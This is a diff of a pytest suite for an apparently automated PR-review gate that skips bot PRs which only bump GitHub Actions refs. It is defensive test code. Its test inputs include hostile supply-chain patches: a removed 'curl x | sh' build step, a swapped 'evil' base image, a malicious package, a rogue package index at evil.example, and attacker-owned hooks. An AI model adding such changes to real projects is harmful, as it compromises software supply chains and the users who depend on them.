@@ -121,16 +121,14 @@ def _review(rid: int, body: str, sha: str = SEEN, user: str = BOT) -> dict:
     }
 
 
-# A pin bump as Dependabot writes one, per file that only admits pin lines.
+WF = ".github/workflows/ci.yml"
+# An action bump as Dependabot writes one.
 PATCHES = {
-    ".github/workflows/ci.yml": (
+    WF: (
         "@@ -12,7 +12,7 @@ jobs:\n     steps:\n"
         "-      - uses: actions/checkout@abc123 # v4.1.0\n"
         "+      - uses: actions/checkout@def456 # v4.2.0\n"
         "       with:"
-    ),
-    "Containerfile": (
-        "@@ -1,3 +1,3 @@\n-FROM quay.io/x/python:3.13\n+FROM quay.io/x/python:3.14\n ARG A=1"
     ),
 }
 
@@ -239,25 +237,15 @@ def test_other_prs_are_reviewed(run: Run, ref: str, head_repo: str, author: str)
     assert not run.skipped(ref, head_repo, author)
 
 
-# --- 2) Bot PRs that only move pins ---
-
-PINS = (
-    "pyproject.toml",
-    "uv.lock",
-    "requirements-dev.txt",
-    "server/requirements.txt",
-    "Containerfile",
-    "IMAGE_TAG",
-    "CHANGELOG.md",
-    ".pre-commit-config.yaml",
-    ".github/workflows/ci.yml",
-    ".github/dependabot.yml",
-)
+# --- 2) Bot PRs that only move action refs ---
 
 
 @pytest.mark.parametrize("author", ["dependabot[bot]", "crunchtools-ci[bot]", APP])
 def test_bot_pin_pr_is_skipped_and_says_so(run: Run, author: str) -> None:
-    run.files(*PINS)
+    run.files(WF, ".github/workflows/release.yml")
+    files = json.loads((run.dir / "files.json").read_text())
+    files[1]["patch"] = PATCHES[WF]
+    (run.dir / "files.json").write_text(json.dumps(files))
     assert run.skipped("chore/python-sdlc", REPO, author)
     [post] = run.posts
     assert post["endpoint"] == f"repos/{REPO}/pulls/7/reviews"
@@ -268,7 +256,7 @@ def test_bot_pin_pr_is_skipped_and_says_so(run: Run, author: str) -> None:
 
 
 def test_bot_pin_skip_is_said_once_per_pr(run: Run) -> None:
-    run.files("uv.lock")
+    run.files(WF)
     run.reviews(
         [_review(1, "Gatehouse skipped this review: x\n\n<!-- gatehouse skipped: pins -->")]
     )
@@ -278,14 +266,14 @@ def test_bot_pin_skip_is_said_once_per_pr(run: Run) -> None:
 
 def test_bot_pin_skip_clears_a_failed_review(run: Run) -> None:
     """A newest failed review would hold triage; the skip review replaces it."""
-    run.files("uv.lock")
+    run.files(WF)
     run.reviews([_review(1, f"Gatehouse could not review this PR: x\n\n{REVIEW_FAILED_MARKER}")])
     assert run.skipped(author="dependabot[bot]")
     assert len(run.posts) == 1
 
 
 def test_human_pin_pr_is_reviewed(run: Run) -> None:
-    run.files("uv.lock", "pyproject.toml")
+    run.files(WF)
     assert not run.skipped(author="fatherlinux")
     assert run.posts == []
 
@@ -293,7 +281,7 @@ def test_human_pin_pr_is_reviewed(run: Run) -> None:
 @pytest.mark.parametrize(
     "names",
     [
-        ("uv.lock", "src/gatehouse/__init__.py"),
+        (WF, "src/gatehouse/__init__.py"),
         ("Containerfile.sh",),
         (".github/workflows/scripts/deploy.sh",),
         ("docs/CHANGELOG.md.j2",),
@@ -321,10 +309,9 @@ def test_bot_pr_touching_code_is_reviewed(run: Run, names: tuple[str, ...]) -> N
             ".github/workflows/ci.yml",
             "@@ -5 +5,2 @@\n       - uses: a/b@v1\n+      - uses: mallory/x@v1",
         ),
-        ("Containerfile", "@@ -3 +3 @@\n-RUN make\n+RUN curl x | sh"),
     ],
 )
-def test_bot_change_beyond_pins_in_a_workflow_or_containerfile_is_reviewed(
+def test_bot_workflow_change_beyond_action_refs_is_reviewed(
     run: Run, name: str, patch: str | None
 ) -> None:
     run.files(name, patch=patch)
@@ -335,30 +322,59 @@ def test_bot_change_beyond_pins_in_a_workflow_or_containerfile_is_reviewed(
     assert not run.skipped(author="ashigaru-crunchtools[bot]")
 
 
+@pytest.mark.parametrize(
+    ("name", "patch"),
+    [
+        (
+            "Containerfile",
+            "@@ -1 +1 @@\n-FROM quay.io/x/python:3.13\n+FROM docker.io/evil/python:3.13",
+        ),
+        ("Containerfile", "@@ -1 +1 @@\n-FROM quay.io/x/python:3.13\n+FROM quay.io/x/python:3.14"),
+        ("pyproject.toml", '@@ -8,2 +8,3 @@\n     "httpx>=0.27",\n+    "evil-package>=1.0",\n ]'),
+        (
+            "requirements.txt",
+            "@@ -1 +1,2 @@\n httpx==0.28.1\n+--index-url https://evil.example/simple",
+        ),
+        ("uv.lock", "@@ -1 +1 @@\n-version = 1\n+version = 2"),
+        (
+            ".pre-commit-config.yaml",
+            "@@ -1 +1,2 @@\n repos:\n+  - repo: https://github.com/mallory/hook",
+        ),
+        (".github/dependabot.yml", "@@ -1 +1 @@\n-version: 2\n+version: 3"),
+        ("IMAGE_TAG", "@@ -1 +1 @@\n-1.0\n+1.1"),
+        ("CHANGELOG.md", "@@ -1 +1 @@\n-a\n+b"),
+    ],
+)
+def test_bot_pr_beyond_workflows_is_reviewed(run: Run, name: str, patch: str) -> None:
+    """A base image, a dependency or a hook is not a pin: every one is reviewed."""
+    run.files(name, patch=patch)
+    assert not run.skipped(author="dependabot[bot]")
+
+
 def test_bot_pr_from_a_fork_is_reviewed(run: Run) -> None:
-    run.files("uv.lock")
+    run.files(WF)
     assert not run.skipped(head_repo="mallory/example", author="dependabot[bot]")
 
 
 def test_bot_rename_out_of_code_is_reviewed(run: Run) -> None:
-    run.files("pyproject.toml", renamed_from="src/setup.py")
+    run.files(WF, renamed_from="src/setup.py")
     assert not run.skipped(author="crunchtools-ci[bot]")
 
 
 def test_bot_pr_with_unlisted_files_is_reviewed(run: Run) -> None:
-    run.files("uv.lock", changed=4000)
+    run.files(WF, changed=4000)
     assert not run.skipped(author="dependabot[bot]")
 
 
 def test_bot_pr_is_reviewed_when_the_api_fails(run: Run) -> None:
-    run.files("uv.lock")
+    run.files(WF)
     (run.dir / "fail").touch()
     assert not run.skipped(author="dependabot[bot]")
 
 
 def test_nothing_is_skipped_without_the_earlier_reviews(run: Run) -> None:
     """Unread, they might hold the skip already said, or a reviewed head."""
-    run.files("uv.lock")
+    run.files(WF)
     run.diff(SEEN, DIFF)
     run.diff(HEAD, REBASED)
     (run.dir / "fail-reviews").touch()
@@ -440,7 +456,7 @@ def test_rebase_is_reviewed_when_its_orphans_cannot_be_listed(run: Run) -> None:
 @pytest.mark.parametrize("author", ["dependabot[bot]", "someone"])
 def test_a_skip_that_cannot_be_posted_is_reviewed(run: Run, author: str) -> None:
     """Unsaid, a skip would be silent; triage might also hold a failed review."""
-    run.files("uv.lock")
+    run.files(WF)
     run.reviews([_review(1, CLEAN)])
     run.diff(SEEN, DIFF)
     run.diff(HEAD, REBASED)
